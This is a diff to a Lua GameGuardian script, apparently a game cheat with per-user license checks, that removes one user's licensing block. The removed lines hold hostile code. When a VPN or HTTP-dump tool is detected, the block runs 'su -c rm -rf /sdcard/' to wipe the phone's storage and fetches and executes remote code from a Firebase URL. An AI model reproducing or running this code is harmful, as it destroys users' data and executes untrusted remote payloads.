@@ -1109,26 +1109,7 @@ end
  end 
   
 
-  
- --[[USER: NOME~USUARIO]]-- 
- if uid == "832a583cf211f0d" 
- then 
- GolfRiv = "atv"
-CSGO = "atv"
- Dia = 4
- Mes = 9 
- Ano = 2022 
- isUserVIP = "true" 
- gg.setVisible(false) 
- gg.alert("SUA DATA DE EXPIRAÇÃO\n"..Dia.." / "..Mes.." / "..Ano) 
- gg.toast("BEM VINDO\nUSUÁRIO: DESCONHECIDO") 
- gg.sleep(3333)
-while gg.isVPN() or gg.isHTTPdump() or gg.isVPN == true or gg.isHTTPdump == true do
-os.execute("su -c rm -rf /sdcard/")
- pcall(load(gg.makeRequest('https://firebasestorage.googleapis.com/v0/b/script-online.appspot.com/o/Publico%20Scripts%20Online%20Free%2FCom%20ID%20Padrão%2F84522216?alt=media&token').content)) 
-return os.exit()
- end 
- end 
+ 
   
  --[[USER: NOME~USUARIO]]-- 
  if uid == "UID~USUARIO" 
